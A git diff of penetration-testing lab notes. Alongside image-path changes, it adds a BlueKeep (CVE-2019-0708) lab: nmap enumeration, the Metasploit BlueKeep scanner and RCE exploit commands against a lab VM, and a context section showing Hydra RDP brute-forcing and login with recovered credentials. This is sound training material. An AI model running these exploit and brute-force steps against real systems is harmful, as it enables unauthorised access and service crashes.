@@ -62,7 +62,7 @@ msf5 auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS 10.0.17.61
 </strong>msf5 auxiliary(scanner/rdp/rdp_scanner) > run
 </code></pre>
 
-<figure><img src="../../../../../.gitbook/assets/image.png" alt=""><figcaption><p>RDP Detected</p></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4).png" alt=""><figcaption><p>RDP Detected</p></figcaption></figure>
 
 > The RDP is running on target port `3333`
 
@@ -100,7 +100,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-30 18:12:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-30 18:13:35
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * In this case, `freerdp` cannot be used in this lab, the only RDP client that can be used is `xfreerdp`.
 
@@ -108,11 +108,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-30 18:13:
 xfreerdp  /u:Administrator /p:qwertyuiop /v:10.0.17.61:3333
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 <details>
 
@@ -124,7 +124,85 @@ xfreerdp  /u:Administrator /p:qwertyuiop /v:10.0.17.61:3333
 
 ***
 
-## Lab 2 (Blue Keep)
+## Lab 2 - Blue Keep
+
+> 🔬 **Extra Lab**
+>
+> Setup a vulnerable _Windows 2008 R2 Virtual Machine_ and connected it to the same network of the Kali virtual machine.
+>
+> * Host system: `Kali Linux`
+> * Target system: `Windows Server 2008 R2`&#x20;
+> * Target IP: `192.168.42.139`&#x20;
+> * Local IP: `192.168.42.132`
+> * Exploitation tool:
+> * Vulnerability: [CVE-2019-0708 - BlueKeep](https://nvd.nist.gov/vuln/detail/CVE-2019-0708)
+
+{% hint style="danger" %}
+Targeting Kernel space memory and apps can cause system crashes.
+{% endhint %}
+
+### Enumeration
+
+```bash
+nmap -sV -sC 192.168.42.139 -Pn   
+```
+
+```bash
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-04 22:36 +08
+Nmap scan report for 192.168.42.139
+Host is up (0.0029s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+445/tcp   open  microsoft-ds       Windows Server 2008 R2 Standard 7600 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server?
+| rdp-ntlm-info: 
+|   Target_Name: WIN-8M9K4MEH6MB
+|   NetBIOS_Domain_Name: WIN-8M9K4MEH6MB
+|   NetBIOS_Computer_Name: WIN-8M9K4MEH6MB
+|   DNS_Domain_Name: WIN-8M9K4MEH6MB
+|   DNS_Computer_Name: WIN-8M9K4MEH6MB
+|   Product_Version: 6.1.7600
+|_  System_Time: 2024-07-04T14:37:17+00:00
+| ssl-cert: Subject: commonName=WIN-8M9K4MEH6MB
+| Not valid before: 2024-07-03T14:36:09
+|_Not valid after:  2025-01-02T14:36:09
+|_ssl-date: 2024-07-04T14:37:57+00:00; 0s from scanner time.
+49154/tcp open  msrpc              Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+```
+
+<figure><img src="../../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+> RDP port 3389 is opened.
+
+* Run `metasploit` auxiliary module to check the target expose to the BlueKeep vulnerability or not.
+
+```bash
+msfconsole
+msf6 > search bluekeep
+msf6 > use 0
+msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set RHOSTS 192.168.42.139
+msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > run
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+> The target is vulnerable
+
+### Exploitation
+
+```bash
+msf6 > use 3
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show targets
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 5
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RHOSTS 192.168.42.139
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+> And boom it crashed&#x20;
 
 
 
